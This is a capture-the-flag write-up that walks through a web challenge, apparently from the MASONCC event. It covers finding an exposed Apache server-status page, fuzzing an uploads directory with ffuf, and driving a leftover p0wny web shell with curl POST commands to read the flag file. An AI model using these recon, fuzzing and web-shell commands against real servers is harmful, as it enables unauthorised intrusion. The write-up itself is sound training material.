🕵️ Web Exploitation Challenge — Full Walkthrough (Final Version)

This is a complete step-by-step walkthrough of everything we did to solve the challenge — from enumeration to server-status leakage, directory fuzzing, web shell discovery, API interaction, and final privilege escalation.

Designed so future-you can reread this and immediately retrace every step.

1️⃣ Initial Discovery — /server-status

While scanning the target:

http://18.212.136.134:9090/server-status


was accessible publicly.

This endpoint exposed:

Live Apache worker logs

All active requests

Filenames accessed inside /uploads/

File extensions

Unknown PHP scripts

This was the first major leak — giving us reconnaissance normally not possible.

2️⃣ Fuzzing /uploads/

We enumerated files under /uploads/ using ffuf/wfuzz:

ffuf -u http://18.212.136.134:9090/uploads/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt


Significant results:

cat.php       (200)
shell.php     (200)
test.txt      (200)
image.jpg     (200)


cat.php seemed harmless…
but shell.php was very suspicious — a common webshell filename.

3️⃣ Verifying shell.php

We tested:

curl "http://18.212.136.134:9090/uploads/shell.php?cmd=id"


It did not execute the command.
Instead, it returned the full HTML source of the p0wny shell.

This revealed:

The uploader accidentally exposed a browser-based interactive shell

It uses POST + feature=shell

Commands are encoded and returned in JSON + base64

This was our entry point.

4️⃣ Using p0wny Shell Programmatically

Correct usage:

curl -X POST "http://18.212.136.134:9090/uploads/shell.php?feature=shell" \
     -d "cmd=ls" \
     -d "cwd=/var/www/html/uploads"


Response:

{"stdout":"YmFzZTY0IGVuY29kZWQ=","cwd":"L3Zhci93d3cvaHRtbC91cGxvYWRz"}


We decoded both fields using:

echo "<value>" | base64 -d


This gave us:

Actual stdout (decoded)

Current working directory (decoded)

From here we had a fully working remote shell.

5️⃣ Exploring the Filesystem

We repeatedly executed:

cmd=ls -la
cmd=cd /
cmd=cat <file>


Every output was base64-encoded, so each needed decoding.

Eventually, exploring / revealed interesting directories:

/root
/flags
/etc
/var/www/html/uploads


The /flags directory contained files visible in decoded output.

6️⃣ Locating the Flag

From decoded directory listings, we found:

/flags/root.txt


We extracted it using:

cmd=cat /flags/root.txt


Again, the response was base64 — we decoded it manually.

This revealed the final flag.

🎉 FINAL FLAG
MASONCC{images_give_us_bash?}


A very appropriate conclusion, sir — the images really did give us bash.
